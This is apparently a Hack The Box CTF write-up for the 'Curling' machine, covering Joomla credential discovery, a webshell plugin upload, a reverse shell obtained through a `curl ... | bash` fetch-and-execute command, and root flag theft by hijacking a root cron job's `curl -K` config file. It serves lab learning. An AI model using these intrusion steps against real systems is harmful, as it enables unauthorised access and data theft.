# Curling - Writeup

**Date**: 13/06/2022

**Difficulty**: Easy

**CTF**: [https://app.hackthebox.com/machines/Curling](https://app.hackthebox.com/machines/Curling)

---

Let’s start testing the connection with the target machine:

![Untitled](images/Untitled.png)

We receive back the packet, so we have connection. Let’s scan the open TCP ports:

![Untitled](images/Untitled%201.png)

The scan discovered 2 open TCP ports: 22 (ssh) and 80 (http). Let’s try to obtain the service and version running in these ports:

![Untitled](images/Untitled%202.png)

We got OpenSSH 7.6p1 running in the port 22.

![Untitled](images/Untitled%203.png)

According to launchpad, the target machine should be a Ubuntu Bionic.

And we have an Apache 2.4.29 service running in the port 80. We can also see that is hosting a Joomla. Let’s try to obtain more info of the website using whatweb:

![Untitled](images/Untitled%204.png)

It doesn’t give us additional useful information. Let’s see how the website looks:

![Untitled](images/Untitled%205.png)

It looks very simple. There are 3 post written by the user Super User. There is something in the first post that catches my eye, the word `curling2018`. It looks like a password maybe? The post is also signed by Floris, maybe that could be a username?It worth the try.

![Untitled](images/Untitled%206.png)

![Untitled](images/Untitled%207.png)

![Untitled](images/Untitled%208.png)

Nope, at least not that combination of user and password. I also tried with `admin` and `administrator` usernames.

Let’s see the source code to see if we can obtain the Joomla version:

![Untitled](images/Untitled%209.png)

secret.txt? weird… It would be a file accessible?

![Untitled](images/Untitled%2010.png)

Yes… it is. Maybe we can try to login again using that string as a password.

I tried, with no success. The way this string looks… maybe is coded in b64?

![Untitled](images/Untitled%2011.png)

Yeah! Let’s try again:

![Untitled](images/Untitled%2012.png)

Woho! We succeded loginwith the credentials `Floris:Curling2018!` let’s note them:

![Untitled](images/Untitled%2013.png)

We seen that the SSH port was open, let’s try to use this credentials to gain access to the target machine:

![Untitled](images/Untitled%2014.png)

Ok, this credentials are not valid for the SSH connection.

Let’s see if we can access to the administration panel of the Joomla:

![Untitled](images/Untitled%2015.png)

![Untitled](images/Untitled%2016.png)

Yup! Let’s see if we can see the version:

![Untitled](images/Untitled%2017.png)

As we are inside the administration panel, maybe we can install a webshell or a reverse shell php file… Let’s investigate.

After a research, I found this github repo:

[https://github.com/p0dalirius/Joomla-webshell-plugin](https://github.com/p0dalirius/Joomla-webshell-plugin)

It contains a Joomla extension that we can upload to the website and it will give us a webshell. Pretty cool!

So, let’s follow all the instructions! And try to execute a command!

![Untitled](images/Untitled%2018.png)

Yeah! We succesfully executed the `ls` command!

Let’s see if we can ping out machine from the target machine:

![Untitled](images/Untitled%2019.png)

Yes we can! Let’s try to establish a revshell to operate more easily:

First of all, I’m going to create a `pwn` file in my system with the payload to establish a reverse shell and share it using a http server:

![Untitled](images/Untitled%2020.png)

Now, I’m going to execute a command that will read that file from my computer and will pipe it to the bash, executing the command:

`curl 10.10.14.234/pwn | bash`

but URL encoded:

`curl%2010.10.14.234%2Fpwn%20%7C%20bash`

![Untitled](images/Untitled%2021.png)

And we obtained a revshell.

![Untitled](images/Untitled%2022.png)

We have no permissions to read the user flag, but we can read the password_backup file:

![Untitled](images/Untitled%2023.png)

Let’s copy it in our machine:

![Untitled](images/Untitled%2024.png)

It looks like an hexadecimal version of something, let’s try to get the original file:

`xxd -revert password_backup password_backup_original`

![Untitled](images/Untitled%2025.png)

Ok, we got a bzip2 file. Let’s decompress it using bzip2 tool:

![Untitled](images/Untitled%2026.png)

And… now we have a gzip file… let’s rename it and decompress it:

![Untitled](images/Untitled%2027.png)

And… another bzip2 file… let’s decompress it:

![Untitled](images/Untitled%2028.png)

Now a POSIX tar. Let’s decompress it too:

![Untitled](images/Untitled%2029.png)

Finally a txt file!

Ok, it’s a strange password, but let’s try to use it to login as `floris` via SSH:

![Untitled](images/Untitled%2030.png)

Yeah, we are in! Let’s read the user flag:

![Untitled](images/Untitled%2031.png)

Now we have to escalate our privileges… Let’s start looking if we have sudo privileges:

![Untitled](images/Untitled%2032.png)

Nothing. Let’s look for SUID binaries:

![Untitled](images/Untitled%2033.png)

None of them (except polkit) can be used to escalate… Let’s look for binaries with capabilities:

![Untitled](images/Untitled%2034.png)

Nothing useful. Maybe there is a cronjob?

![Untitled](images/Untitled%2035.png)

Nope. Maybe can we edit something that is in the PATH?

![Untitled](images/Untitled%2036.png)

Ok, I’m out of ideas, so let’s go back to the initial point. There is a folder we have not inspected yet.

The modification date of the files was suspicious, I waited a minute to confirm that they are being updated each minute.

![Untitled](images/Untitled%2037.png)

Nice moment to use pspy to see what’s going on.

![Untitled](images/Untitled%2038.png)

each minute, the input file is being overwritten and after that, a curl command is being executed. I’m sure I can use this to escalate or, at least, to read the /root/root.txt flag.

![Untitled](images/Untitled%2039.png)

the `-K` option reads the config from input file.

![Untitled](images/Untitled%2040.png)

The input is pointing to [localhost](http://localhost) IP.

Ok, so I think that there are some possibilities:

1. Try to edit the content of `input` file after the script that executes each minute does it and before the automatic `curl` command.
2. Try to redirect the [localhost](http://localhost) to other folder instead of `/var/www/http`
3. Try to include a file into the web the curl is requesting that only root has access to (/root/root.txt)

Let’s start with the first one.

![Untitled](images/Untitled%2041.png)

After looking to the pspy a while, we can recognize some scripts being executed:

- `/bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input` : This script is waiting 1 second, and then, copying the content of the file **default.txt** inside the **input** file
- `curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report` : This script is doing a **curl** to the url inside the **input** file and saving the response inside the file **report**

I’m thinking that, as the first script is waiting 1 second before executing the curl, maybe is executing after the curl script. This would mean that if we edit the input file, the curl may use our URL instead of the default one? Let’s try.

As `curl` accepts the `url="file//path-to-file"` parameter, we can point to `/root/root.txt` hoping the flag is there. If it’s there and this script is executing first, we should copy the content of the flag into the `report` file. We have to be fast, as after 1 minute, the cult command will use the default input file and will overwrite the report file.

![Untitled](images/Untitled%2042.png)

So, I have changed the content of `input`. As can be seen in the bottom of the image, after the change, the report remains as the webpage content.

![Untitled](images/Untitled%2043.png)

After a minute I performed a `cat report` command, and voila! We got the root flag content.